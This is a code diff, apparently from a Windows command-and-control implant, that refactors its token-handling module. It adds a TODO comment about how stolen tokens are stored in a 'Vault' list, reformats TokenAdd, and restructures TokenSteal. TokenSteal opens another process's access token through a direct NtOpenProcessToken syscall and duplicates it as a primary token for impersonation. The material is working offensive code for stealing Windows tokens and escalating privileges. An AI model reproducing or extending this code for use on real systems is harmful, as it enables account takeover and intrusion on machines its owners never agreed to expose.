@@ -10,6 +10,20 @@
 
 #include <ntstatus.h>
 
+/* TODO: Change the way new tokens gets added.
+ *
+ * Instead of appending it to the newest token like:
+ * TokenNew->Next = Token
+ *
+ * Add it to the first token (parent):
+ *
+ * Token->Next            = Instance->Tokens.Vault;
+ * Instance->Tokens.Vault = Token;
+ *
+ * Might reduce some code which i care more than
+ * token order.
+ * */
+
 BOOL TokenSetPrivilege( LPSTR Privilege, BOOL Enable )
 {
     TOKEN_PRIVILEGES TokenPrivileges = { 0 };
@@ -81,7 +95,9 @@ DWORD TokenAdd( HANDLE hToken, LPSTR DomainUser, SHORT Type, DWORD dwProcessID, 
         if ( TokenList )
         {
             if ( TokenList->NextToken != NULL )
+            {
                 TokenList = TokenList->NextToken;
+            }
             else
             {
                 TokenList->NextToken = TokenEntry;
@@ -107,10 +123,15 @@ HANDLE TokenSteal( DWORD ProcessID )
     hProcess = ProcessOpen( ProcessID, PROCESS_QUERY_LIMITED_INFORMATION );
     if ( hProcess )
     {
-        NtStatus = Instance->Syscall.NtOpenProcessToken( hProcess, TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE, &hToken );
-        if ( NT_SUCCESS( NtStatus ) )
+        if ( NT_SUCCESS( NtStatus = Instance->Syscall.NtOpenProcessToken( hProcess, TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE, &hToken ) ) )
         {
-            if ( ! Win32_DuplicateTokenEx( hToken, TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID | TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY, NULL, SecurityImpersonation | SecurityIdentification, TokenPrimary, &hTokenDup ) )
+            if ( ! Win32_DuplicateTokenEx(
+                        hToken,
+                        TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID | TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY,
+                        NULL,
+                        SecurityImpersonation | SecurityIdentification, TokenPrimary, &hTokenDup
+                    )
+                )
             {
                 PRINTF( "[!] DuplicateTokenEx() error : % u\n", NtGetLastError()) ;
                 CALLBACK_GETLASTERROR
